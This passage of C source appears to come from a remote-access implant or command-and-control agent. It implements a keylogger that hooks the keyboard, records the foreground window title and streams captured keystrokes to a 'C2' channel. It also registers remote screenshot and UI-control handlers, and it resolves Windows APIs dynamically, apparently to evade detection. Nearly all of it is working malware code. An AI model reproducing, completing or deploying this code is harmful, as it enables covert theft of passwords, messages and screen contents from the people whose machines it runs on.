
    return result;
}

/* ================================================================== */
/* Keyscan streaming pipe callbacks                                    */
/* ================================================================== */

static int keyscan_pipe_create(pipe_t *pipe, c2_t *c2)
{
    pipe->data = NULL;
    pipe->c2 = c2;
    keyscan_active_pipe = pipe;
    keyscan_push_len = 0;

    keyscan_ensure_running();

    if (!keyscan_running)
    {
        keyscan_active_pipe = NULL;
        return -1;
    }

    /* Start the coalescing flush thread */
    keyscan_flush_thread = w.pCreateThread(
        NULL, 0, keyscan_flush_proc, NULL, 0, NULL);

    return 0;
}

static int keyscan_pipe_heartbeat(pipe_t *pipe, c2_t *c2)
{
    return keyscan_running ? 0 : -1;
}

static int keyscan_pipe_destroy(pipe_t *pipe, c2_t *c2)
{
    /* 1. Null the active pipe so the flush thread stops enqueuing
     *    new packets to the C2 channel. */
    keyscan_active_pipe = NULL;

    /* 2. Signal the keylogger hook and flush thread to stop.
     *    The flush thread checks keyscan_running and will exit. */
    keyscan_running = 0;

    /* 3. Wait for the flush thread to finish its final flush and exit.
     *    This must happen BEFORE we delete the critical section. */
    if (keyscan_flush_thread != NULL)
    {
        w.pWaitForSingleObject(keyscan_flush_thread, 3000);
        w.pCloseHandle(keyscan_flush_thread);
        keyscan_flush_thread = NULL;
    }

    /* 4. Tear down the hook and its message-pump thread.
     *    (Cannot use keyscan_ensure_stopped here because
     *     keyscan_running is already 0.) */
    if (keyscan_hook)
    {
        w.pUnhookWindowsHookEx(keyscan_hook);
        keyscan_hook = NULL;
    }

    if (keyscan_thread)
    {
        w.pPostThreadMessageA(w.pGetThreadId(keyscan_thread), WM_QUIT, 0, 0);
        w.pWaitForSingleObject(keyscan_thread, 5000);
        w.pCloseHandle(keyscan_thread);
        keyscan_thread = NULL;
    }

    /* 5. All threads stopped — safe to destroy the critical section. */
    w.pDeleteCriticalSection(&keyscan_cs);

    return 0;
}

/* ================================================================== */
/* COT entry                                                           */
/* ================================================================== */

COT_ENTRY
{
    /* ---- gdi32.dll — screenshot ---- */
    w.pCreateCompatibleDC     = (fn_CreateCompatibleDC)cot_resolve("gdi32.dll", "CreateCompatibleDC");
    w.pDeleteDC               = (fn_DeleteDC)cot_resolve("gdi32.dll", "DeleteDC");
    w.pCreateCompatibleBitmap = (fn_CreateCompatibleBitmap)cot_resolve("gdi32.dll", "CreateCompatibleBitmap");
    w.pSelectObject           = (fn_SelectObject)cot_resolve("gdi32.dll", "SelectObject");
    w.pDeleteObject           = (fn_DeleteObject)cot_resolve("gdi32.dll", "DeleteObject");
    w.pBitBlt                 = (fn_BitBlt)cot_resolve("gdi32.dll", "BitBlt");
    w.pGetDeviceCaps          = (fn_GetDeviceCaps)cot_resolve("gdi32.dll", "GetDeviceCaps");
    w.pGetObjectA             = (fn_GetObjectA)cot_resolve("gdi32.dll", "GetObjectA");
    w.pGetDIBits              = (fn_GetDIBits)cot_resolve("gdi32.dll", "GetDIBits");

    /* ---- user32.dll — screenshot ---- */
    w.pGetDC                  = (fn_GetDC)cot_resolve("user32.dll", "GetDC");
    w.pReleaseDC              = (fn_ReleaseDC)cot_resolve("user32.dll", "ReleaseDC");
    w.pGetSystemMetrics       = (fn_GetSystemMetrics)cot_resolve("user32.dll", "GetSystemMetrics");

    /* ---- user32.dll — uictl + keyscan (shared) ---- */
    w.pSetWindowsHookExA      = (fn_SetWindowsHookExA)cot_resolve("user32.dll", "SetWindowsHookExA");
    w.pUnhookWindowsHookEx    = (fn_UnhookWindowsHookEx)cot_resolve("user32.dll", "UnhookWindowsHookEx");
    w.pCallNextHookEx         = (fn_CallNextHookEx)cot_resolve("user32.dll", "CallNextHookEx");

    /* ---- user32.dll — keyscan ---- */
    w.pGetKeyboardState       = (fn_GetKeyboardState)cot_resolve("user32.dll", "GetKeyboardState");
    w.pToUnicode              = (fn_ToUnicode)cot_resolve("user32.dll", "ToUnicode");
    w.pGetMessageA            = (fn_GetMessageA)cot_resolve("user32.dll", "GetMessageA");
    w.pPeekMessageA           = (fn_PeekMessageA)cot_resolve("user32.dll", "PeekMessageA");
    w.pTranslateMessage       = (fn_TranslateMessage)cot_resolve("user32.dll", "TranslateMessage");
    w.pDispatchMessageA       = (fn_DispatchMessageA)cot_resolve("user32.dll", "DispatchMessageA");
    w.pPostThreadMessageA     = (fn_PostThreadMessageA)cot_resolve("user32.dll", "PostThreadMessageA");

    /* ---- kernel32.dll — screenshot ---- */
    w.pGlobalAlloc            = (fn_GlobalAlloc)cot_resolve("kernel32.dll", "GlobalAlloc");
    w.pGlobalLock             = (fn_GlobalLock)cot_resolve("kernel32.dll", "GlobalLock");
    w.pGlobalUnlock           = (fn_GlobalUnlock)cot_resolve("kernel32.dll", "GlobalUnlock");
    w.pGlobalFree             = (fn_GlobalFree)cot_resolve("kernel32.dll", "GlobalFree");

    /* ---- kernel32.dll — keyscan ---- */
    w.pEnterCriticalSection      = (fn_EnterCriticalSection)cot_resolve("kernel32.dll", "EnterCriticalSection");
    w.pLeaveCriticalSection      = (fn_LeaveCriticalSection)cot_resolve("kernel32.dll", "LeaveCriticalSection");
    w.pInitializeCriticalSection = (fn_InitializeCriticalSection)cot_resolve("kernel32.dll", "InitializeCriticalSection");
    w.pDeleteCriticalSection     = (fn_DeleteCriticalSection)cot_resolve("kernel32.dll", "DeleteCriticalSection");
    w.pWideCharToMultiByte       = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll", "WideCharToMultiByte");
    w.pCreateThread              = (fn_CreateThread)cot_resolve("kernel32.dll", "CreateThread");
    w.pGetThreadId               = (fn_GetThreadId)cot_resolve("kernel32.dll", "GetThreadId");
    w.pWaitForSingleObject       = (fn_WaitForSingleObject)cot_resolve("kernel32.dll", "WaitForSingleObject");
    w.pCloseHandle               = (fn_CloseHandle)cot_resolve("kernel32.dll", "CloseHandle");
    w.pSleep                     = (fn_Sleep)cot_resolve("kernel32.dll", "Sleep");
    w.pGetLastError              = (fn_GetLastError)cot_resolve("kernel32.dll", "GetLastError");
    w.pCreateEventA              = (fn_CreateEventA)cot_resolve("kernel32.dll", "CreateEventA");
    w.pSetEvent                  = (fn_SetEvent)cot_resolve("kernel32.dll", "SetEvent");


    /* ---- user32.dll — keyscan window tracking ---- */
    w.pGetForegroundWindow       = (fn_GetForegroundWindow)cot_resolve("user32.dll", "GetForegroundWindow");
    w.pGetWindowTextA            = (fn_GetWindowTextA)cot_resolve("user32.dll", "GetWindowTextA");

    /* ---- msvcrt.dll — keyscan ---- */
    w.p_snprintf                 = (fn__snprintf)cot_resolve("msvcrt.dll", "_snprintf");

    /* Register API handlers */
    api_call_register(api_calls, UI_SCREENSHOT, (api_t)ui_screenshot);
    api_call_register(api_calls, UICTL_SET,     (api_t)uictl_set);
    api_call_register(api_calls, UICTL_GET,     (api_t)uictl_get);
    api_call_register(api_calls, KEYSCAN_START, (api_t)keyscan_start);
    api_call_register(api_calls, KEYSCAN_STOP,  (api_t)keyscan_stop);
    api_call_register(api_calls, KEYSCAN_DUMP,  (api_t)keyscan_dump);

    /* Register UI pipe (screenshot streaming) */
    {
        pipe_callbacks_t callbacks;
        memset(&callbacks, 0, sizeof(callbacks));
        callbacks.create_cb = ui_pipe_create;
        callbacks.readall_cb = ui_pipe_readall;
        callbacks.destroy_cb = ui_pipe_destroy;
        api_pipe_register(pipes, UI_PIPE, callbacks);
    }

    /* Register keyscan pipe (push-based keystroke events) */
    {
        pipe_callbacks_t callbacks;
        memset(&callbacks, 0, sizeof(callbacks));
        callbacks.create_cb = keyscan_pipe_create;
        callbacks.heartbeat_cb = keyscan_pipe_heartbeat;
        callbacks.destroy_cb = keyscan_pipe_destroy;
        api_pipe_register(pipes, KEYSCAN_PIPE, callbacks);
    }
}

#endif
